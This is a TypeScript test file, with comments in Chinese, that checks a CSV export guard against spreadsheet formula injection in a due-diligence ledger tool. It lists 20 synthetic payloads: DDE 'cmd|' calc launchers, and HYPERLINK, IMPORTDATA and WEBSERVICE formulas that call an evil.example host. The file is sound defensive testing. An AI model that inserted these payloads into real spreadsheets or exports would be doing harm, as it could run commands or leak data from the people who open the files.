// 【施工单-10 单元一】表格导出公式注入防御·内核合同测试（CSV 面）。
// 负例=合成 payload 20 个（=cmd|／=HYPERLINK／+1-1／@SUM／\t=／\r=／空格先行／IE 前缀变体等）
// 过 ledgerToCsv 后 CSV 文本读回：命中注入起始形者首字符必为 `'` 且其余逐字保留；
// 纯数字金额（负数/千分位）不拦；干净值零改写（防御不改交付值）。
// 真桥 HTTP 下载直出/SpreadsheetML/xlsx 侧由 tools/bridge/tabular_export_synthetic.mjs 覆盖。
import { describe, expect, it } from "vitest";
import { csvFormulaGuard, isCsvFormulaLead } from "../src/kernel/tabularExportGuard.ts";
import { ledgerToCsv, type Ledger } from "../src/kernel/diligenceLedgerModel.ts";
import { parseCsvTable } from "../../juscite-edisc/src/tableKernel.ts";

// 合成负例 20（全合成材料；机制口径=A 报告 §④ 条 6/7 Excel 公式注入家族）
export const CSV_PAYLOADS: string[] = [
  "=cmd|'/C calc'!A0",
  "=CMD|' /C calc'!A0",
  "=2+5+cmd|'/C calc'!A0",
  "=HYPERLINK(\"http://evil.example/x\",\"点击\")",
  "=HYPERLINK(\"javascript:alert(1)\",\"x\")",
  "+1-1",
  "+cmd|'/C calc'!A0",
  "-2+3+cmd|'/C notepad'!A0",
  "@SUM(A1:A2)",
  "@cmd|'/C calc'!A0",
  "\t=cmd|'/C calc'!A0",
  "\r=cmd|'/C calc'!A0",
  "\n=1+1",
  " =cmd|'/C calc'!A0",
  "\t+HYPERLINK(\"http://evil.example\",\"x\")",
  "\t-2+2",
  "\r@SUM(1,2)",
  "=IMPORTDATA(\"http://evil.example/csv.csv\")",
  "=WEBSERVICE(\"http://evil.example/ping\")",
  "=@SUM(1+1)*cmd|'/C calc'!A0",
];

function ledgerWith(values: string[]): Ledger {
  return {
    ledgerId: "dledg_synth", caseId: "case_synth", schemaName: "尽调合成模板",
    fields: [{ name: "备注", type: "text" }, { name: "金额", type: "text" }],
    rows: values.map((v, i) => ({
      rowNo: i + 1, docId: `doc_${i + 1}`, docTitle: `合成底稿${i + 1}.txt`,
      cells: { 备注: { value: v, origin: "rule" as const, evidence: null }, 金额: { value: "100.00", origin: "rule" as const, evidence: null } },
    })),
    status: "open", createdAt: "2026-11-01T00:00:00Z", updatedAt: "2026-11-01T00:00:00Z",
  };
}

/** 读回：按真实解析器（RFC4180 状态机）还原单元格文本，再核首字符。 */
function readBackCells(csv: string): string[][] {
  return parseCsvTable(csv.replace(/^\uFEFF/, ""), "回读").flatMap((t) => t.rows.map((r) => r.cells));
}

describe("tabularExportGuard 注入起始形判定（闭集）", () => {
  it("20 个合成 payload 全部判为注入起始形", () => {
    for (const p of CSV_PAYLOADS) expect(isCsvFormulaLead(p)).toBe(true);
  });
  it("干净值不命中（纯数字金额另由 guard 豁免，见下）", () => {
    for (const clean of ["合计金额", "7200.00", "A+B 合同", "#REF!", "＝全角等号不是注入向量", ""]) {
      expect(isCsvFormulaLead(clean)).toBe(false);
    }
  });
  it("guard 命中即前置 '，其余逐字保留；未命中原样返回", () => {
    expect(csvFormulaGuard("=cmd|'/C calc'!A0")).toBe("'=cmd|'/C calc'!A0");
    expect(csvFormulaGuard("\t=1+1")).toBe("'\t=1+1");
    expect(csvFormulaGuard("-1200.00")).toBe("-1200.00");
    expect(csvFormulaGuard("7200.00")).toBe("7200.00");
    expect(csvFormulaGuard("普通备注，含逗号")).toBe("普通备注，含逗号");
  });
});

describe("ledgerToCsv 导出面（盘上落盘与下载直出同源 choke）", () => {
  it("20 个 payload 过导出后 CSV 读回首字符均为 '，其余字节逐字保留", () => {
    const cells = readBackCells(ledgerToCsv(ledgerWith(CSV_PAYLOADS))).slice(1); // 去表头
    expect(cells.length).toBe(CSV_PAYLOADS.length);
    CSV_PAYLOADS.forEach((p, i) => {
      const v = cells[i]![1]!; // 备注列
      expect(v.startsWith("'")).toBe(true);
      expect(v.slice(1)).toBe(p);
    });
  });
  it("纯数字金额与干净值零改写（防御不触碰合法交付值）", () => {
    const cells = readBackCells(ledgerToCsv(ledgerWith(["-1200.00", "+300", "-1,200.50"]))).slice(1);
    expect(cells.map((c) => c[1])).toEqual(["-1200.00", "+300", "-1,200.50"]);
  });
  it("含逗号/引号 payload：引号化与前置 ' 叠加后读回仍首字符 '", () => {
    const p = "@SUM(A1,\"x\"),B2";
    const cells = readBackCells(ledgerToCsv(ledgerWith([p]))).slice(1);
    expect(cells[0]![1]).toBe("'" + p);
  });
  it("回归：干净台账 CSV 与既有口径一致（表头/底稿列/CRLF）", () => {
    const csv = ledgerToCsv(ledgerWith(["正常备注"]));
    expect(csv).toBe("底稿文件,备注,金额\r\n合成底稿1.txt,正常备注,100.00\r\n");
  });
  it("用户可配列名同样过防御（列名以 = 开头被前置 '，读回验证）", () => {
    const ledger = ledgerWith(["正常"]);
    ledger.fields = [{ name: "=HYPERLINK(\"http://evil.example\")", type: "text" }];
    ledger.rows[0]!.cells = { "=HYPERLINK(\"http://evil.example\")": { value: "正常", origin: "rule", evidence: null } };
    const header = readBackCells(ledgerToCsv(ledger))[0]!;
    expect(header[1]).toBe("'=HYPERLINK(\"http://evil.example\")");
  });
});
